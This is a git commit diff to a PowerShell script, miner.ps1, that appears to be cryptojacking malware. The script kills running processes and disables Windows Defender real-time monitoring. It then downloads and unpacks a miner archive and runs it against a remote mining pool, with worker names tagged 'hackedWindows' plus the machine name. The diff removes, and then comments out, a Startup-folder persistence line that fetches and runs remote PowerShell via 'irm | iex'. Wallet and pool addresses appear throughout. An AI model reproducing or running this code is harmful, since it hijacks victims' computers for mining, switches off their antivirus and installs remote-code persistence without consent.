f05174ed1b114412ede1a877c0e36e0e90b702d1
zlc1004 <91501777+zlc1004@users.noreply.github.com>
2024-10-05 22:49:22 -0700

    Update miner.ps1

--- miner.ps1
+++ miner.ps1
@@ -3,8 +3,8 @@ taskkill /IM w3wp.exe /F
 taskkill /IM msedge.exe /F
 taskkill /IM Batch.exe /F
 Set-MpPreference -DisableRealtimeMonitoring $true
-Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm http://lucasz228.us.to:50000/getminer | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
-Invoke-WebRequest "https://raw.githubusercontent.com/zlc1003/miner/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
+rem Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
+Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
-./xmrig.exe -o xmrig.nanswap.com:3333 -a rx -k -u nano_3acbzt3t66d51edrp9jrnmg5wpr363g5e6udf5otn8s5ppp7dnubbz5epeci -p x
+./cpuminer.exe -o stratum+tcp://bowserlab.ddns.net:6033 -u "9HuMXoLqu8FsSBfk9fNEKGh88z2fddkpwi.hackedWindows$($Env:ComputerName)" -p c=XMG
